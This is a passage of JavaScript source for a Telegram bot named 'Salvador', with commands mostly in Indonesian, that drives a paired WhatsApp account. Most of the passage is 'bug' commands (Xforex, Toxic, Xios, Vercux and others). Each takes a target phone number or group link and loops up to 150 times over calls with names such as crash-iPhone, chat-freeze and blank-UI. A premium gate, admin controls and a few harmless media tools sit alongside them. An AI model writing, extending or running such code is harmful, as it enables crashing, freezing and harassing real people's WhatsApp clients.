<blockquote><strong>𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑</strong></blockquote>
↯ Author     : @iniNexiReal
↯ Version    : 27.0 
↯ Platform   : Telegram 
↯ type script : No spam & spam bugs
↯ ID: ${userId}
↯ Username: ${Name}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${waStatus}
`;

 const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "XTOOLS",
        callback_data: "all_menu",
        style: 'Primary',
      },
    ],
    [
      {
        text: "XBUGS",
        callback_data: "bug_menu",
        style: 'Danger',
      },
      {
        text: "XSETTINGS",
        callback_data: "owner_menu",
        style: 'Primary',
      },
    ],
    [
      {
        text: "AUTHOR",
        url: "https://t.me/iniNexiReal",
        style: 'Success',
      },
    ]
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
//////// -- CASE TOOLS --- \\\\\\\\\\\
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Salvador ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
//////// -- CASE BUG GROUP --- \\\\\\\\\\\
bot.command("Vercux", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Penggunaan Salah.\nContoh: /Vercux https://chat.whatsapp.com/xxxx atau /blankgroup 1203xxxxxx@g.us`);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
       caption: `SUKSES CUYY
☇ Target: https://chat.whatsapp.com/${groupId}
☇ Status: Succes
☇ Type: /Vercux
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "back" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 25; i++) {
        await SennBlankUiGroupNew(sock, target);
        await sleep(3500);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("Xforex", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Xforex 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Xforex 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug CurseDelay ${i + 1}/150 To ${q}`));
      await VnXNewSpamNotifToDelayInvisV2(sock, target);
      await sleep(4500);
      await TrashRespon(sock, target);
    }
  })();
});
bot.command("Bonex", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Bonex 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Bonex 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 3; i++) {
      console.log(chalk.red(`Send Bug Delay ${i + 1}/3 To ${q}`));
      await Delay(sock, target);
      await sleep(4000);
      await TrashRespon(sock, target);
    }
  })();
});
bot.command("Xaviera", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Xaviera 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Xaviera 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug Delay ${i + 1}/100 To ${q}`));
      await VnXNewDelayHardStcInvis(sock, target);
      await sleep(4000);
      await TrashRespon(sock, target);
    }
  })();
});
bot.command("Xios", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Xios 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Xios 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.red(`Send Bug Crash iPhone ${i + 1}/5 To ${q}`));
      await Ipongforcloseivs(target);
      await sleep(1000);
    }
  })();
});
bot.command("Toxic", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Toxic 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Toxic 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await XTVXTVXTV(sock, target);
      await sleep(3000);
      await TrashRespon(sock, target);
      await ChatFreeze(sock, target);
      await sleep(3000); 
      await CrmXcarousel(sock, target);
    }
  })();
});

bot.command("Nocturnal", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Nocturnal 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Nocturnal
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await VnXNewStuckNotif(sock, target);
      await sleep(3000);
      await VnXNewblankNotif(sock, target);
      await UiTrash(target);
      await VnXNewSpamNotifToDelayInvisV2(sock, target);
    }
  })();
});

bot.command("Cxoo", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Cxoo 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Cxoo 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Blanl klik ${i + 1}/10 To ${q}`));
      await VnXNewOneButtonsBlnk(sock, target);
      await sleep(3000);
    }
  })();
});

bot.command("Viox", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Viox 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Viox 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Crash iPhone ${i + 1}/150 To ${q}`));
      await Ipongforcloseivs(target);
      await sleep(3000);
      await TrashRespon(sock, target);
    }
  })();
});

bot.command("Zirox", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Zirox 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Zirox 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Delay X Crash ${i + 1}/150 To ${q}`));
      await AmbaPlerBgt(sock, target);
      await sleep(3000);
      await TrashRespon(sock, target);
      await ChatLoCk(target);
    }
  })();
});

bot.command("Noskil", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Noskil 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Noskil 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await VnXNewDelayTended(sock, target);
      await sleep(3000);
      await VnXNewDenglayHardInpis(sock, target);
      await TrashRespon(sock, target);
    }
  })();
});

bot.command("Nebula", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Nebula 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Nebula 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await CrashiOS(target);
      await sleep(3000);
    }
  })();
});

bot.command("SevenX", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /SevenX 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /SevenX 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/30 To ${q}`));
      await VnXNewDelayXBlank(sock, target);
      await sleep(3000);
    }
  })();
});

bot.command("SadXit", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /SadXit 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let mention = true;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /SadXit 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await VnXNewForceIphoneSw(sock, target, mention = true);
      await sleep(3000);
    }
  })();
});

bot.command("Winter", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Winter 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let mention = true;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Winter 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await VnXNewDenglayInpisCuy(sock, target);
      await sleep(3000);
    }
  })();
});

bot.command("Virtux", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Virtux 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let mention = true;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Virtux 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/100 To ${q}`));
      await VnXNewStuckLogo(sock, target);
      await sleep(3000);
      await VnXNewDenglayInpisCuy(sock, target);
    }
  })();
});

bot.command("Farming", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Farming 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let mention = true;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Farming 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/1 To ${q}`));
      await stclook(target);
    }
  })();
});

bot.command("DiorX", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /DiorX 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  let mention = true;

  await ctx.sendPhoto("https://files.catbox.moe/cvdggy.jpg", {
    caption: `
<blockquote>交 Salvador Attack ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /DiorX 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Succes send bug ${i + 1}/150 To ${q}`));
      await VnXNewfrezeeHard(sock, target);
      await sleep(2000);
    }
  })();
});
///=== comand blockcmd ===\\\
// ===============================
// BLOCK CMD GROUP - TELEGRAF
// ===============================

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "SENNOFFC");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
